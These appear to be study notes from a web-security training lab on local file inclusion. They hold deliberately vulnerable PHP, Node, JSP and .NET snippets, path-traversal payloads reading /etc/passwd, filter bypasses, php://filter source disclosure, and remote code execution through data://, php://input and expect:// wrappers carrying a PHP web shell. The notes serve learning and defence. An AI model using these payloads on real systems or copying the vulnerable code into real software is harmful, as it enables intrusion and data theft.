# Sample of code vulnerable to LFI

Code: php
if (isset($_GET['language'])) {
    include($_GET['language']);
}

# Outros parametros que podem ser vulneráveis

include_once(), require(), require_once(), file_get_contents()

# The following is a basic example of how a GET parameter language is used to control what data is written to a page:

if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}

# The following example shows uses the language parameter to determine which directory it should pull the about.html page from:

Code: js
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});

# The following examples show how web applications for a Java web server may include local files based on the specified parameter, using the include function:

Code: jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>

#  The import function may also be used to render a local file or a URL, such as the following example:

Code: jsp
<c:import url= "<%= request.getParameter('language') %>"/>

# The Response.WriteFile function works very similarly to all of our earlier examples, as it takes a file path for its input and writes its content to the response.
# The path may be retrieved from a GET parameter for dynamic content loading, as follows:

Code: cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}

# Furthermore, the @Html.Partial() function may also be used to render the specified file as part of the front-end template, similarly to what we saw earlier:

Code: cs
@Html.Partial(HttpContext.Request.Query['language'])

Code: cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->

# The following table shows which functions may execute files and which only read file content:

Function					Read 		Content		Execute	Remote URL
PHP			
include()/include_once()	✅			✅			✅
require()/require_once()	✅			✅			❌
file_get_contents()			✅			❌			✅
fopen()/file()				✅			❌			❌

NodeJS			
fs.readFile()				✅			❌			❌
fs.sendFile()				✅			❌			❌
res.render()                ✅			✅			❌

Java			
include						✅			❌			❌
import						✅			✅			✅

.NET			
@Html.Partial()				✅			❌			❌
@Html.RemotePartial()		✅			❌			✅
Response.WriteFile()		✅			❌			❌
include						✅			✅			✅

# Exemplos de LFI

http://94.237.55.163:47420/index.php?language=/../../../../../../usr/share/flags/flag.txt
http://94.237.55.163:47420/index.php?language=/../../../../etc/passwd

# Basic Bypasses
# Non-Recursive Path Traversal Filters

# We see that all ../ substrings were removed, which resulted in a final path being ./languages/etc/passwd. However, this filter is very insecure, as it is
# not recursively removing the ../ substring, as it runs a single time on the input string and does not apply the filter on the output string.
# For example, if we use ....// as our payload, then the filter would remove ../ and the output string would be ../, which means we may still perform path traversal. 

http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd

# Encoding

http://<SERVER_IP>:<PORT>/index.php?language=%2e%2e%2f%2e%2e

# Approved Paths

# Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path.
# For example, the web application we have been dealing with may only accept paths that are under the ./languages directory, as follows:

Code: php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}

# Exemplo de bypass

http://<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd

# Path Truncation

# An example of such payload would be the following:

Code: url
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]

# Path Truncation
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././

# Null Bytes

/etc/passwd%00
/etc/passwd%00.php

http://83.136.250.104:37680/index.php?language=languages/....//....//....//....//....//flag.txt

# PHP Filters
# Source Code Disclosure

Code: url
php://filter/read=convert.base64-encode/resource=config
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
http://83.136.253.251:32633/index.php?language=php://filter/read=convert.base64-encode/resource=configure

# As we can see, unlike our attempt with regular LFI, using the base64 filter returned an encoded string instead of the empty result we saw earlier.
# We can now decode this string to get the content of the source code of config.php, as follows:

echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d

if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}

# PHP Wrappers
# Checking PHP Configurations

# To do so, we can include the PHP configuration file found at (/etc/php/X.Y/apache2/php.ini) for Apache or at (/etc/php/X.Y/fpm/php.ini) for Nginx, where X.Y is your install PHP version.
# We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file.
# We will also use the base64 filter we used in the previous section, as .ini files are similar to .php files and should be encoded to avoid breaking.
# Finally, we'll use cURL or Burp instead of a browser, as the output string could be very long and we should be able to properly capture it:

curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

# Once we have the base64 encoded string, we can decode it and grep for allow_url_include to see its value:

# Checking PHP Configurations

echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
allow_url_include = On

# Remote Code Execution

# With allow_url_include enabled, we can proceed with our data wrapper attack.
# As mentioned earlier, the data wrapper can be used to include external data, including PHP code.
# We can also pass it base64 encoded strings with text/plain;base64, and it has the ability to decode them and execute the PHP code.
# So, our first step would be to base64 encode a basic PHP web shell, as follows:

# Remote Code Execution
echo '<?php system($_GET["cmd"]); ?>' | base64

http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

# Input

# Similar to the data wrapper, the input wrapper can be used to include external input and execute PHP code.
# The difference between it and the data wrapper is that we pass our input to the input wrapper as a POST request's data.
# So, the vulnerable parameter must accept POST requests for this attack to work.
# Finally, the input wrapper also depends on the allow_url_include setting, as mentioned earlier.
# To repeat our earlier attack but with the input wrapper, we can send a POST request to the vulnerable URL and add our web shell as POST data.
# To execute a command, we would pass it as a GET parameter, as we did in our previous attack:

curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid

# Expect

# Finally, we may utilize the expect wrapper, which allows us to directly run commands through URL streams.
# Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands.
# However, expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases.
# We can determine whether it is installed on the back-end server just like we did with allow_url_include earlier, but we'd grep for expect instead, and if it is installed and enabled we'd get the following:

echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect

# As we can see, the extension configuration keyword is used to enable the expect module, which means we should be able to use it for gaining RCE through the LFI vulnerability.
# To use the expect module, we can use the expect:// wrapper and then pass the command we want to execute, as follows:

curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)


  
